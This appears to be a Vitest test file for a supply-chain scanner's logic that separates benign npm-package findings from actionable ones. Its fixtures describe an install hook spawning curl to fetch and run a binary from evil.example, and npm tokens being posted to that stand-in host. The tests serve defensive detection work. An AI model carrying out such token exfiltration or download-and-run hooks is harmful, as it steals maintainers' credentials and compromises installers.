import { describe, expect, it } from "vitest";
import type { Finding } from "../models.js";
import {
  filterActionableFindings,
  isBenignFinding,
  isBenignInvestigationSummary,
} from "./investigate.js";

function finding(overrides: Partial<Finding> = {}): Finding {
  return {
    capability: "NETWORK",
    confidence: "CONFIRMED",
    fileLine: "index.js:1-10",
    problem: "posts process.env.NPM_TOKEN to a remote endpoint",
    evidence: "require_and_trace observed POST https://evil.example/collect",
    reproductionStrategy: "Run require_and_trace and assert the POST occurs",
    ...overrides,
  };
}

describe("isBenignFinding", () => {
  it("filters absence-of-risk findings from investigation output", () => {
    expect(
      isBenignFinding(finding({
        capability: "NETWORK",
        problem: "No network I/O operations observed during module loading and schema parsing",
        evidence: "Zero HTTP/HTTPS requests, zero fetch() calls, zero data exfiltration.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "CREDENTIAL_THEFT",
        problem: "No credential theft mechanisms present in published files",
        evidence: "No process.env, process.argv, child_process, exec(), spawn() calls in published files.",
      })),
    ).toBe(true);
  });

  it("filters benign explanations for legitimate or type-only code", () => {
    expect(
      isBenignFinding(finding({
        capability: "FILESYSTEM",
        problem: ".d.cts files are standard TypeScript declaration files (types only) - not executable code",
        evidence: "Node.js does not execute .d.ts/.d.cts declaration files.",
      })),
    ).toBe(true);

    expect(
      isBenignFinding(finding({
        capability: "EVAL",
        problem: "allowsEval runtime probe detects if dynamic code construction is allowed - intentional feature detection",
        evidence: "Only affects JIT fastpath and falls back to safe recursive traversal.",
      })),
    ).toBe(true);
  });

  it("keeps actionable malicious findings", () => {
    expect(isBenignFinding(finding())).toBe(false);

    expect(
      isBenignFinding(finding({
        capability: "PROCESS_SPAWN",
        problem: "postinstall spawns curl to download and execute a binary",
        evidence: "runLifecycleHook observed child_process.spawn('curl', ['https://evil.example/a'])",
      })),
    ).toBe(false);
  });
});

describe("filterActionableFindings", () => {
  it("drops zod-style non-issues while retaining real findings", () => {
    const kept = finding({
      capability: "ENV_VARS",
      problem: "reads process.env.NPM_TOKEN and sends it over HTTPS",
      evidence: "Trace observed env access followed by POST https://evil.example/token",
    });
    const filtered = filterActionableFindings([
      finding({
        capability: "LIFECYCLE_HOOK",
        problem: "No lifecycle hooks present in package.json",
        evidence: "None execute during package installation.",
      }),
      finding({
        capability: "PERFORMANCE",
        problem: "ModeWriter invoked twice - performance concern, not security issue",
        evidence: "Safe but potentially inefficient.",
      }),
      kept,
    ]);

    expect(filtered).toEqual([kept]);
  });
});

describe("isBenignInvestigationSummary", () => {
  it("detects summaries that explicitly refute the triage signal", () => {
    expect(
      isBenignInvestigationSummary(
        "Investigation found no malicious behavior. All prior flags were false positives.",
      ),
    ).toBe(true);

    expect(
      isBenignInvestigationSummary(
        "Runtime execution confirmed no network calls, filesystem writes, process spawning, or credential theft.",
      ),
    ).toBe(false);
  });
});
